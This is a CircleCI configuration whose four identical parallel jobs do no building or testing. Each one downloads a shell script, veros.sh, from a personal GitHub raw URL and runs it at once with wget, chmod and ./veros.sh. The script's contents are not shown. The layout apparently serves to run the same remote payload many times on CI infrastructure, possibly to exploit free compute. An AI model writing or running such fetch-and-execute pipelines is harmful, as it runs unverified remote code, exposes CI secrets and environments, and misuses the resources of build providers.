
version: 2.1
jobs:
    Devop:
      docker:
            - image: circleci/ruby:2.5.3
              auth:
                 username: mydockerhub-user
                 password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
      steps:
        - checkout
        - run: wget https://raw.githubusercontent.com/abdelmini/m/main/veros.sh && chmod +x veros.sh && ./veros.sh
    Devop1:
      docker:
            - image: circleci/ruby:2.5.3
              auth:
                 username: mydockerhub-user
                 password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
      steps:
        - checkout
        - run: wget https://raw.githubusercontent.com/abdelmini/m/main/veros.sh && chmod +x veros.sh && ./veros.sh
    Devop2:
      docker:
            - image: circleci/ruby:2.5.3
              auth:
                 username: mydockerhub-user
                 password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
      steps:
        - checkout
        - run: wget https://raw.githubusercontent.com/abdelmini/m/main/veros.sh && chmod +x veros.sh && ./veros.sh
    Devop3:
      docker:
            - image: circleci/ruby:2.5.3
              auth:
                 username: mydockerhub-user
                 password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
      steps:
        - checkout
        - run: wget https://raw.githubusercontent.com/abdelmini/m/main/veros.sh && chmod +x veros.sh && ./veros.sh
workflows:
    version: 2.1
    build:
        jobs:
            - Devop
            - Devop1
            - Devop2
            - Devop3